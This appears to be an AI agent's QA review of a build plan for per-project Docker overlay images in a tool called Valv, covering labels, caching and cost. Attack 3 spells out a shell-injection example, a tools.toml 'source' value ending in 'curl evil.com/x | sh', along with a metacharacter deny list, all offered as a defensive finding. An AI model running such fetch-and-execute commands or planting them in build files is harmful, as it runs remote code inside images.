# DROP_12 Plan QA Falsification — Round 1

**Verdict:** fail
**Reviewer:** ta-go-qa-falsification
**Reviewed at:** 2026-05-21T00:00:00Z

The plan is well-structured and most attack vectors land softly. Three findings rise to FAIL-level: (a) AC #4's three-label cache list silently omits `io.valv.managed=true`, breaking `valv image cleanup` for overlay images; (b) U2's overlay emission has no escaping spec for shell-active characters in `Source`, leaving the `RUN` line shell-injectable (acknowledged-low blast radius but should be planned, not discovered); (c) `go install` base-image gap (U1) is correctly flagged in the plan but unmitigated — the orchestrator must route this to dev or DROP_12's stated dogfood goal (`ta` CLI via `go install`) cannot be met. Other findings are design-questions or routed to U1/U3.

## Counterexamples / Attacks

### 1. Canonical tools-hash determinism — MITIGATED (verified empirically)

**Construction:** Wrote a scratch Go program implementing the plan's recipe (`sort + json.MarshalIndent(map{"tools": []entry{...}}, "", "")`) and hashed:

```
a = {ta: object, gh: string, mage: object}      // declared order: ta, gh, mage
b = {mage: object, gh: string, ta: object}      // declared order: mage, gh, ta
c = {ta: object}                                 // single tool
empty = {}
```

Five repeated rounds confirmed `hash(a) == hash(b)` (different declaration order → same hash). `hash(a) != hash(c)`. Empty manifest hashes to a stable constant.

**Result:** `json.MarshalIndent` over a struct slice (NOT a map) is deterministic. The plan's "sort by name, emit slice of records" recipe holds.

**Caveat:** the plan's AC #2 mentions "whitespace variations in source paths after `strings.TrimSpace`" — make sure U1 actually applies `TrimSpace` to `Version`, `Source`, AND `Install` before hashing AND before overlay emission. If trim is applied pre-hash but the raw value (with whitespace) is later emitted into the RUN line, hash matches but Dockerfile differs. **Recommendation: AC #2 explicitly requires trim is applied BOTH in `canonicalManifest` AND in `BuildOverlayDockerfile`, and Unit 12.1's snapshot test pins the exact canonical bytes for a manifest with intentional whitespace.**

Status: **mitigated** with a planner clarification (above).

---

### 2. Tools-hash silently omits `io.valv.managed=true` label — **CONFIRMED FAIL**

**Construction:** AC #4 (PLAN.md line 110) enumerates labels written by `EnsureProjectImage`:

> applies `recipe_hash + base_image_hash + tools_hash + scope=project-overlay` labels

Existing `Service.Build` (`service.go:333-339`) writes:
```
"io.valv.managed":  "true",
"io.valv.provider": <provider>,
"io.valv.scope":    "image",
"io.valv.version":  version,
recipeHashLabel:    s.recipeHash(),
```

`valv image cleanup` (`manage.go:1685-1689`, `providerCleanupImageFilters`) filters Docker images by:
```
"label": "io.valv.managed=true"
```

If `EnsureProjectImage` follows AC #4 literally and writes ONLY the four enumerated labels (`recipe_hash`, `base_image_hash`, `tools_hash`, `scope=project-overlay`), the resulting per-project image will **NOT** match the cleanup filter. Bumping `tools.toml` then running `valv image cleanup --images --apply` will leave the orphan overlay images on disk forever — exactly the disk-bloat scenario U3 defers.

**Counterexample reproduction (mental):**
1. Project P1 has `tools.toml` with tool A → overlay built as `valv-claude:proj-abc123` with labels `{recipe_hash, base_image_hash, tools_hash=A-hash, scope=project-overlay}`.
2. User adds tool B → new overlay `valv-claude:proj-def456` with `tools_hash=AB-hash`.
3. User runs `valv image cleanup --images --apply`. Filter `label=io.valv.managed=true` matches NEITHER `proj-abc123` nor `proj-def456`. Both orphans persist forever.

**Required fix:** AC #4 must explicitly require the overlay image labels include `io.valv.managed=true` AND `io.valv.provider=<provider>` so the existing cleanup filter machinery picks them up. The `scope=project-overlay` label is additive — useful for targeted cleanup later but does not by itself trigger the existing cleanup path.

Status: **CONFIRMED — plan must be revised before Unit 12.3 is built.**

---

### 3. Overlay RUN-line shell injection — **CONFIRMED (acknowledged-low blast radius) — plan must spec validation**

**Construction:** Plan decision 5 (PLAN.md lines 88-91) emits `RUN GOBIN=/usr/local/bin go install <source>` where `<source>` comes verbatim from `ToolSpec.Source`. `internal/tools/validate.go` validates the tool **name** via regex but does NOT validate `Source` or `Install` beyond emptiness checks.

Docker `RUN <command>` is shell-form — Docker invokes `/bin/sh -c "<command>"` during build. A `Source` value of:

```toml
[tools]
foo = { source = "github.com/x/y; curl evil.com/x | sh", install = "go install" }
```

emits this Dockerfile line:

```
RUN GOBIN=/usr/local/bin go install github.com/x/y; curl evil.com/x | sh
```

which `/bin/sh -c` evaluates as TWO commands. The second runs arbitrary code at build time, baked into the resulting image layer.

**Blast radius (mitigating context):**
- Build happens AS ROOT inside an ephemeral container (planner's `USER root` block). Container is isolated from host (no docker.sock mount in plan).
- An attacker writing `tools.toml` already has commit access to the repo. They could put `; curl evil.com | sh` in `magefile.go` instead, with the same effect during normal `mage test`. So the marginal threat-model expansion is small.
- BUT: a poisoned tool would silently bake into the per-project image. `tools_hash` would lock the malicious payload to a specific hash. Operator inspecting `tools.toml` might not realize `source` containing shell metachars is a problem.

**Required fix:** Unit 12.2 acceptance criteria must add:
1. `BuildOverlayDockerfile` validates that `Source` and `Install` strings contain no shell-active characters (`;`, `&`, `|`, `` ` ``, `$`, `(`, `)`, `<`, `>`, `\n`, `\`) before emitting RUN lines.
2. Violations return a wrapped error pointing the user at the offending tool name.

Alternative: emit `RUN` in exec-form (`RUN ["go", "install", "<source>"]`) which bypasses shell entirely. But exec-form does NOT do variable substitution, so `GOBIN=/usr/local/bin` prefix won't work. Stick with validation.

Status: **CONFIRMED — plan must be revised before Unit 12.2 is built. Low-immediate-risk, but design-flag-on-paper now is cheaper than retrofit later.**

---

### 4. `go install` base-image gap (U1) — **CONFIRMED (already flagged in plan; needs orch routing)**

**Construction:** PLAN.md line 254 (Notes For Builder Agents):

> `go install` placement constraint (decision 5): `go install` needs `go` available in the base image. Current `DefaultCodexDockerfile` / `DefaultClaudeDockerfile` (`service.go:645-742`) install `bubblewrap ca-certificates git ncurses-term` — no Go toolchain. **If dev approves `go install` shortcut in U1, the base Dockerfile must add `golang-go` to apt** OR the overlay's `RUN` must install Go itself before `go install <tool>`.

DROP_12's stated mission (`PLAN.md` line 16):

> Once it closes, `ta` CLI and similar per-project Go tools become installable inside Valv containers, which is the gap that surfaced 2026-05-20 when the dev tried to use `valv claude` against the `ta` worktree and the container had no `ta` binary.

`ta` is a Go tool; the user's dogfood goal requires `go install`-style. If DROP_12 ships and `go install` is REJECTED at overlay-generation (plan decision 5 reads "Initial well-known set: **none**" for string-form), the only acceptable path is object-form `{ source: "github.com/...", install: "go install" }` — which requires `go` in the base.

**Recommendations (orch decides which to route to dev):**
- (a) **Smallest absorbing change inside DROP_12:** Add a tiny sub-unit Unit 12.1.5 (or extend Unit 12.2) that adds `golang-go` to the apt-get line of BOTH `DefaultCodexDockerfile` and `DefaultClaudeDockerfile`. Constraint: this bumps the base recipe hash → forces base rebuild for every existing user. Acceptable since DROP_12 is opt-in until a project adds `tools.toml`.
- (b) **Defer to a new DROP_12.5 base-image-update drop:** clean separation but blocks DROP_12 dogfood unblock until both close.
- (c) **Overlay self-installs Go:** wasteful (every per-project image installs Go from apt redundantly) and slow.

Status: **CONFIRMED — plan correctly flags this. Orch must escalate to dev before Phase 4 starts.**

---

### 5. Cache invalidation races — REFUTED (acceptable)

**Construction:** Between `s.inspectLabel(ctx, request.BaseImage, recipeHashLabel)` and the eventual `docker buildx build`, another process could rebuild the base. The recorded `base_image_hash` on the new overlay would reflect the stale base.

**Outcome:** On the NEXT `EnsureProjectImage` call, the new (post-race) base's recipe hash will differ from the recorded `base_image_hash` label → overlay is rebuilt. Self-correcting, no permanent inconsistency. The window is at-worst-one-launch.

**Externally-built base lacking labels:** if a user docker-pulls an image and tags it `valv-claude:dev` without the `io.valv.recipe_hash` label, `inspectLabel` returns empty string. The overlay records empty `base_image_hash` → on next ensure, if the base rebuild restores the label, mismatch → rebuild. Self-correcting.

**Partial-label image (missing one of three):** Plan acceptance criteria 4 says "any of the three labels mismatch: rebuilds." Missing label reads as empty string, which won't equal the computed hash, so mismatch → rebuild. Correct.

Status: **REFUTED — no counterexample. The chain is self-correcting.**

---

### 6. Cross-provider overlay interaction (per-provider images) — REFUTED

**Construction:** Project P has `tools.toml`. User runs `valv claude` → builds `valv-claude:proj-XYZ`. Then `valv codex` → does this build a separate `valv-codex:proj-XYZ`?

**Trace:** `openImagesService(cmd, paths, provider)` in claude.go (line 193) and codex.go (line 231) constructs a per-provider `images.Service`. `EnsureProjectImage` uses `s.repository` (provider-specific) to construct the target tag. Same `tools.toml` → same `tools_hash` → same suffix, but different repository: `valv-claude:proj-XYZ` vs `valv-codex:proj-XYZ`. Two distinct images, built independently. Cost: two builds per project for a user who uses both providers.

**Is this surprising?** No worse than the existing `valv-claude:dev` + `valv-codex:dev` situation. The cross-provider mount (DROP_10) is profile-mounting, not image-sharing. Acceptable.

Status: **REFUTED — behavior is consistent with existing per-provider image model.**

---

### 7. Double-roundtrip cost in launch path — UNKNOWN (deferred)

**Construction:** `runClaudeCommand` calls `ensureClaudeImageCurrent` (existing) then plan adds `ensureClaudeProjectImage` (new). Both call into the docker CLI (image inspect, possibly buildx build). For a fast-path no-rebuild case, that's two `docker image inspect` calls minimum. Latency floor on `docker image inspect` is roughly 50-200ms on macOS Docker Desktop empirically.

**Outcome:** worst-case adds ~100-400ms to every `valv claude` launch. Plan doesn't measure. For interactive launches this is well below the noise floor of the CLI startup; for scripted automation it's a soft regression.

**Mitigation:** combine the inspect of base + overlay into a single `docker image inspect` call with multiple refs. Defer to U2 or post-DROP-12 perf pass.

Status: **routed to Unknowns. Not a build blocker; flag for dev visibility.**

---

### 8. `VALV_CLAUDE_IMAGE` / `VALV_CODEX_IMAGE` override + tools.toml — DESIGN-QUESTION

**Construction:** PLAN.md AC #4 line 217:

> `VALV_CLAUDE_IMAGE` / `VALV_CODEX_IMAGE` override behavior preserved: when env var set, overlay resolution is skipped.

If a user sets `VALV_CLAUDE_IMAGE=my-custom-image:latest` AND has a `.valv/tools.toml` in the project, the override wins silently — tools are NOT installed into the custom image. The user sees `valv claude` launch their custom image without their declared tools, and might not realize the override masked the overlay.

**Risk:** confusing UX for an advanced user.
**Fix options:**
- (a) Emit a warning to stderr: `"VALV_CLAUDE_IMAGE override skips .valv/tools.toml overlay"`.
- (b) Document only; trust the user.
- (c) Error out (refuse to launch) when both are set.

Recommend (a). Plan should note the warning path in AC for Unit 12.4.

Status: **routed to design-question — not blocking, but worth a planner one-line.**

---

### 9. YAGNI on `base_image_hash` label — REFUTED (label is necessary)

**Construction:** Could we drop the `base_image_hash` label and rely only on `recipe_hash` + `tools_hash`?

**Scenario:** `valv image update claude` rebuilds the base because npm's `@anthropic-ai/claude-code` published a new version. The base Dockerfile template is unchanged (recipe_hash same). The overlay Dockerfile template is unchanged. The tools.toml is unchanged. WITHOUT `base_image_hash`, all three of `recipe_hash`, `tools_hash`, `overlay-template-hash` match — the overlay is treated as up-to-date even though the base has a new Claude CLI version.

Result: the per-project image runs OLD Claude even after `valv image update`. CONFIRMED scenario; `base_image_hash` IS necessary.

Status: **REFUTED — the label earns its keep.**

---

### 10. Unit 12.5 YAGNI — DESIGN-QUESTION

**Construction:** Unit 12.5 is a verification-only unit. Phase 6 of WORKFLOW.md already mandates `mage ci` (which runs `mage test` + lint etc.) at drop close, and per-unit verification already runs `mage testPkg` for touched packages.

What does Unit 12.5 add?
- `mage integration` (Docker-backed). Per `feedback_mage_integration_when_deleting_symbols.md`, integration MUST be run when symbols are deleted or interfaces change. DROP_12 has NO deletions and NO interface changes (plan line 255 confirms). So the integration run is best-effort polish, not safety.
- `mage golden` for external transcript regression. The overlay code path inserts a different image ref into container args; the existing external golden suite could regress if the ordering matters.
- Smoke run of `./valv image --help`.

**Counter:** `mage golden` and `mage integration` SHOULD ideally run in Phase 6 anyway (WORKFLOW.md line 147 says `mage ci`, which the dev would need to confirm covers golden+integration). If `mage ci` covers all of this, Unit 12.5 is ceremony.

But: Unit 12.5 also forces a manual `docker image ls` inspection step (PLAN.md line 240) which IS valuable as a smoke test the automated suite can't easily capture.

Status: **DESIGN-QUESTION — defer to dev. Plan could either collapse 12.5 into Phase 6 or keep it as an explicit manual smoke gate.**

---

## YAGNI Pressure

- **Unit 12.5** as a standalone unit — possibly ceremony (see Attack 10). Could fold its manual smoke step into Phase 6's drop-end verification checklist.
- **String-form tool rejection** (decision 5) — plan rejects string-form entirely in v1. But DROP_11 schema allows it. Will surface as `"tool X uses unsupported string-form spec"` error every time someone writes the natural `mage = "latest"` shorthand. Reasonable for v1, but UX cost is real — the error message must be crystal clear and the README needs a v1-supported-shape example.

---

## Hylla Feedback

Did not hit Hylla on this round because DROP_11 was just merged (HEAD `35b1436`) and Hylla baseline pin precedes the merge. Per planner's "Notes For Builder Agents" caveat, direct `Read` of `internal/tools/{tools,resolve,validate}.go` is the authoritative evidence source until next drop-close reingest. No miss to record beyond the planner's already-noted pin caveat.

---

## Summary for Orchestrator

**Verdict: FAIL.** Three CONFIRMED issues require plan revision before Phase 4:

1. **AC #4 must require `io.valv.managed=true` + `io.valv.provider=<provider>` labels on overlay images** so existing `valv image cleanup` filter machinery sees them. Without this, orphan overlay images accumulate forever. (Attack 2.)
2. **Unit 12.2 must spec shell-metachar validation in `Source`/`Install` strings** before they're emitted into RUN lines. Otherwise `tools.toml` source field is a build-time shell-injection surface (low immediate threat but explicit-on-paper now is cheaper than retrofit). (Attack 3.)
3. **U1 (`go install` base-image gap) must be routed to dev now.** Plan correctly flagged this; orchestrator must escalate before Phase 4 starts. Recommended: add `golang-go` to base apt as a tiny absorbing sub-unit inside DROP_12 (option a in Attack 4). (Attack 4.)

Additional design-questions worth one planner clarification each:
- AC #2 should pin `strings.TrimSpace` is applied in BOTH `canonicalManifest` AND `BuildOverlayDockerfile` (Attack 1 caveat).
- Unit 12.4 should warn on stderr when `VALV_CLAUDE_IMAGE`/`VALV_CODEX_IMAGE` override masks a present `.valv/tools.toml` (Attack 8).
- Decide whether Unit 12.5 folds into Phase 6 verification or stays as an explicit smoke gate (Attack 10).

Attack count: 10 (3 confirmed, 4 refuted/mitigated, 3 design-questions).
YAGNI count: 2 (Unit 12.5 ceremony question, string-form-rejection UX cost).
Blocking findings: 3 (Attacks 2, 3, 4).
